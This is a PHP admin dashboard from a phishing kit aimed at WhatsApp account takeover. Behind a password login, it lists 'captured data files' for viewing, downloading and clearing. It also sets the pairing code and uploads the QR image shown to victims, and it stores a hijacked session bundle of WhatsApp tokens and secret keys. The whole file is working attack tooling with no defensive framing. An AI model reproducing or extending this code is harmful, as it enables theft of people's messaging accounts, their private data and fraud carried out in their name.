<?php
require_once __DIR__ . '/config.php';
$cfg = require __DIR__ . '/config.php';
session_start();

$err = '';
if (isset($_POST['password'])) {
    if (hash_equals($cfg['admin_password'], $_POST['password'])) {
        $_SESSION['wa_admin'] = true;
    } else {
        $err = 'Wrong password.';
    }
}
if (isset($_GET['logout'])) {
    unset($_SESSION['wa_admin']);
    session_destroy();
    header('Location: admin.php');
    exit;
}

$authed = !empty($_SESSION['wa_admin']);

// Handle actions when authed
if ($authed && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $act = isset($_POST['action']) ? $_POST['action'] : '';

    if ($act === 'clear' && isset($_POST['file'])) {
        $name = basename($_POST['file']);
        $path = $cfg['data_dir'] . '/' . $name;
        if (is_file($path)) @unlink($path);
        header('Location: admin.php?msg=cleared');
        exit;
    }

    if ($act === 'set_code') {
        $code = trim($_POST['code'] ?? '');
        @file_put_contents($cfg['code_file'], $code, LOCK_EX);
        header('Location: admin.php?msg=code_set');
        exit;
    }

    if ($act === 'upload_qr' && isset($_FILES['qr'])) {
        if ($_FILES['qr']['error'] === UPLOAD_ERR_OK) {
            @move_uploaded_file($_FILES['qr']['tmp_name'], $cfg['qr_file']);
        }
        header('Location: admin.php?msg=qr_uploaded');
        exit;
    }

    if ($act === 'save_session' && isset($_POST['session'])) {
        $data = json_decode($_POST['session'], true);
        if (is_array($data)) {
            $data['_saved_at'] = date('c');
            @file_put_contents($cfg['session_file'], json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
        }
        header('Location: admin.php?msg=session_saved');
        exit;
    }
}

function countEntries($path) {
    if (!is_file($path)) return 0;
    $raw = @file_get_contents($path);
    $d = json_decode($raw, true);
    if (is_array($d) && array_is_list($d)) return count($d);
    return $raw ? 1 : 0;
}

$files = [];
if (is_dir($cfg['data_dir'])) {
    foreach (scandir($cfg['data_dir']) as $f) {
        if ($f === '.' || $f === '..') continue;
        $p = $cfg['data_dir'] . '/' . $f;
        if (is_file($p)) {
            $files[] = ['name' => $f, 'size' => filesize($p), 'count' => countEntries($p), 'mtime' => filemtime($p)];
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin — Phishing Pages</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:"Segoe UI",Arial,sans-serif;background:#111b21;color:#e9edef;padding:24px}
h1{font-weight:300;margin-bottom:8px}
h2{font-weight:400;margin:24px 0 12px;color:#00a884}
a{color:#00a884;text-decoration:none}
a:hover{text-decoration:underline}
.card{background:#202c33;border:1px solid #2a3942;border-radius:8px;padding:16px;margin-bottom:16px}
table{width:100%;border-collapse:collapse}
th,td{padding:8px 10px;border-bottom:1px solid #2a3942;text-align:left;font-size:14px}
th{color:#8696a0;font-weight:500}
.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:12px;background:#2a3942;color:#e9edef}
.badge.ok{background:#00a884;color:#fff}
.btn{background:#00a884;color:#fff;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:13px;margin-right:4px}
.btn.danger{background:#f15c6d}
.btn.secondary{background:#2a3942;color:#e9edef}
input,textarea{background:#2a3942;border:1px solid #2a3942;color:#e9edef;padding:8px;border-radius:4px;width:100%;font-size:14px}
textarea{font-family:monospace;min-height:120px}
.row{display:flex;gap:12px;flex-wrap:wrap}
.col{flex:1;min-width:260px}
.msg{background:#00a884;color:#fff;padding:8px 12px;border-radius:4px;margin-bottom:12px;display:inline-block}
.login{max-width:360px;margin:80px auto}
</style>
</head>
<body>

<?php if (!$authed): ?>
<div class="login card">
  <h1>Admin login</h1>
  <?php if ($err): ?><p style="color:#f15c6d;margin-bottom:8px"><?php echo htmlspecialchars($err); ?></p><?php endif; ?>
  <form method="POST">
    <input type="password" name="password" placeholder="Password" autofocus>
    <button class="btn" type="submit" style="margin-top:12px;width:100%">Sign in</button>
  </form>
</div>
<?php else: ?>

<h1>Admin dashboard</h1>
<p><a href="?logout=1">Logout</a> &nbsp;|&nbsp; <a href="index.php">View pages</a></p>

<?php if (isset($_GET['msg'])): ?>
  <div class="msg"><?php echo htmlspecialchars($_GET['msg']); ?></div>
<?php endif; ?>

<h2>Status</h2>
<div class="card">
  <p>WhatsApp session linked: <span class="badge <?php echo is_file($cfg['session_file']) ? 'ok' : ''; ?>"><?php echo is_file($cfg['session_file']) ? 'YES' : 'NO'; ?></span></p>
  <p style="margin-top:6px">Pairing code file: <span class="badge"><?php echo is_file($cfg['code_file']) ? htmlspecialchars(trim(file_get_contents($cfg['code_file']))) : '—'; ?></span></p>
  <p style="margin-top:6px">QR image: <span class="badge"><?php echo is_file($cfg['qr_file']) ? 'present' : 'missing'; ?></span></p>
</div>

<h2>Captured data files</h2>
<div class="card">
  <table>
    <tr><th>File</th><th>Entries</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
    <?php foreach ($files as $f): ?>
    <tr>
      <td><?php echo htmlspecialchars($f['name']); ?></td>
      <td><?php echo (int)$f['count']; ?></td>
      <td><?php echo (int)$f['size']; ?> B</td>
      <td><?php echo date('Y-m-d H:i:s', $f['mtime']); ?></td>
      <td>
        <a class="btn secondary" href="admin.php?view=<?php echo urlencode($f['name']); ?>">View</a>
        <a class="btn secondary" href="data/<?php echo urlencode($f['name']); ?>" download>Download</a>
        <form method="POST" style="display:inline" onsubmit="return confirm('Clear this file?')">
          <input type="hidden" name="action" value="clear">
          <input type="hidden" name="file" value="<?php echo htmlspecialchars($f['name']); ?>">
          <button class="btn danger" type="submit">Clear</button>
        </form>
      </td>
    </tr>
    <?php endforeach; ?>
    <?php if (!$files): ?><tr><td colspan="5">No data files yet.</td></tr><?php endif; ?>
  </table>
</div>

<?php if (isset($_GET['view'])):
    $vn = basename($_GET['view']);
    $vp = $cfg['data_dir'] . '/' . $vn;
    $content = is_file($vp) ? file_get_contents($vp) : '';
?>
<h2>Viewing: <?php echo htmlspecialchars($vn); ?></h2>
<div class="card">
  <pre style="white-space:pre-wrap;word-break:break-all;font-size:13px;max-height:400px;overflow:auto"><?php echo htmlspecialchars($content); ?></pre>
</div>
<?php endif; ?>

<div class="row">
  <div class="col card">
    <h2 style="margin-top:0">Set pairing code</h2>
    <form method="POST">
      <input type="hidden" name="action" value="set_code">
      <input type="text" name="code" placeholder="ABCD-EFGH" value="<?php echo is_file($cfg['code_file']) ? htmlspecialchars(trim(file_get_contents($cfg['code_file']))) : ''; ?>">
      <button class="btn" type="submit" style="margin-top:8px">Save code</button>
    </form>
  </div>

  <div class="col card">
    <h2 style="margin-top:0">Upload QR image</h2>
    <form method="POST" enctype="multipart/form-data">
      <input type="hidden" name="action" value="upload_qr">
      <input type="file" name="qr" accept="image/*">
      <button class="btn" type="submit" style="margin-top:8px">Upload</button>
    </form>
  </div>
</div>

<div class="card">
  <h2 style="margin-top:0">Save session bundle (wa-s-id.json)</h2>
  <form method="POST">
    <input type="hidden" name="action" value="save_session">
    <textarea name="session" placeholder='{"WAToken1":"...","WAToken2":"...","WASecretBundle":"...","WABrowserId":"..."}'></textarea>
    <button class="btn" type="submit" style="margin-top:8px">Save session</button>
  </form>
</div>

<?php endif; ?>
</body>
</html>
